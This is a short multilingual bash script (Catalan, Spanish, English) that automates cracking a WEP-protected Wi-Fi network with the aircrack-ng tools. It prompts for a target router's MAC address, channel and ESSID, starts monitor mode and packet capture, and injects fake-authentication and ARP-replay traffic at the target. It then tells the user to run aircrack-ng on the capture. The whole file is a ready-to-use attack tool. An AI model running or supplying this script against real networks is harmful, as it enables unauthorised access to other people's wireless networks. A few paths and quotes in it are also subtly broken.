#!/bin/bash
#set -x

. /etc/default/locale
case "$LANG" in
ca*)
root="Necessites ser ROOT"
interface="Introdueix la Interface Wifi a utilitzar"
routermac=" *  Introdueix la MAC de la wifi seleccionada"
channelask=" *  Introdueix el canal de la wifi seleccionada"
essidask=" *  Introdueix la ESSID de la wifi seleccionada"
nomon="No es pot engegar cap monitor"
simon="Introdueix el nom del monitor engegat (ex. mon0)"
end="* A partir de 5000 data (no beacon) executa:    *"
;;
es*)
root="Necessitas ser ROOT"
interface="Introduce la Interfaz Wifi a usar"
routermac=" *  Introduce la MAC de la wifi seleccionada"
channelask=" *  Introduce el canal de la wifi seleccionada"
essidask=" *  Introduce la ESSID de la wifi seleccionada"
nomon="No se puede iniciar ningún monitor"
simon="Introduce el nombre del monitor iniciado (ej. mon0)"
end="* A partir de 5000 data (no beacon) ejecuta: *"

;;
en*|*)
root="You need to be ROOT"
interface="Introduce Wifi Interface to use"
routermac=" *  Introduce MAC address of target Wifi"
channelask=" *  Introduce channel of Wifi target"
essidask=" *  Introduce ESSID of selected Wifi"
nomon="Cannot open any monitor"
simon="Introduce recent started name monitor (ex. mon0)"
end="* When you have at least 5000 data (no beacon) execute: *"
;;

esac


[ "`whoami`" != "root" ] && echo "$root" && exit 1

echo "$interface"
ls /sys/class/net

read wifi

mac=$(cat /sys/class/net/$wifi/address)

echo "*******************************"

iwlist $wifi scan

echo "*******************************"

echo
echo "$routermac"
read router

echo 
echo "$channelask"

read channel

echo
echo "$essidask"

read essid

for i in 1 2 3
do
    airmon-ng start $wifi $channel
    [ -n "`ls /sys/class/net/mon*`" ] && break
    sleep 1
done

#si no es s'ha engegat cap monitor, mata'l
[ -z "`ls /sys/class/net/mon*`" ] && echo "$nomon" && exit 1

echo "$simon"

read monitor

echo "*************************"


xterm -e "airodump-ng -w captura -c $channel $monitor"  &  #(es deixa engegat) 


cd /tmp

echo
echo
echo "*********************************************"
echo "$end"
echo "*      cd /tmp                      *
*      aircrack-ng *.cap            *
*********************************************"
echo
echo


xterm -e "sleep 5 ; cd /tmp ; aireplay-ng -1 0 -e "$essid" -a $router -h $mac $monitor ; aireplay-ng -3 -b $router -h $mac $monitor " &



#aircrack-ng captura

